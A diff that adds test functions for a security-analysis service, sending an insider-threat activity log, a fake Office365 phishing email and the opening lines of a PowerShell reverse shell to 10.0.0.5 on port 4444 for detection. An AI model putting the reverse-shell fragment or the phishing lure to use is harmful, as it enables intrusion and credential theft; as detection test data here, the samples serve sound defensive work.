@@ -127,6 +127,36 @@ def test_deadman_switch():
     except Exception as e:
         print(f"Error: {e}")
 
+def test_ueba_agent():
+    print("\n--- Testing UEBA Agent (Insider Threat) ---")
+    log = "User 'sarah.connor' accessed 45GB of Salesforce HR data and attempted to transfer it via USB at 03:15 AM."
+    try:
+        response = requests.post(f"{BASE_URL}/analyze/ueba", json={"user_activity_log": log})
+        print(f"Status Code: {response.status_code}")
+        print(json.dumps(response.json(), indent=4))
+    except Exception as e:
+        print(f"Error: {e}")
+
+def test_phishing_agent():
+    print("\n--- Testing Phishing Security Agent ---")
+    email = "URGENT: Your Office365 password expires in 2 hours. Click here to reset: http://login-microsoft-secure-auth.com/reset"
+    try:
+        response = requests.post(f"{BASE_URL}/analyze/phishing", json={"email_content": email})
+        print(f"Status Code: {response.status_code}")
+        print(json.dumps(response.json(), indent=4))
+    except Exception as e:
+        print(f"Error: {e}")
+
+def test_sandbox_agent():
+    print("\n--- Testing Sandbox Static Code Analyzer ---")
+    script = "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.5', 4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0};"
+    try:
+        response = requests.post(f"{BASE_URL}/analyze/sandbox", json={"malware_code": script})
+        print(f"Status Code: {response.status_code}")
+        print(json.dumps(response.json(), indent=4))
+    except Exception as e:
+        print(f"Error: {e}")
+
 if __name__ == "__main__":
     print("Ensure you have the server running in another terminal (python main.py)\n")
     test_db_guard()
@@ -148,3 +178,9 @@ if __name__ == "__main__":
     test_reporting_agent()
     time.sleep(2)
     test_deadman_switch()
+    time.sleep(2)
+    test_ueba_agent()
+    time.sleep(2)
+    test_phishing_agent()
+    time.sleep(2)
+    test_sandbox_agent()
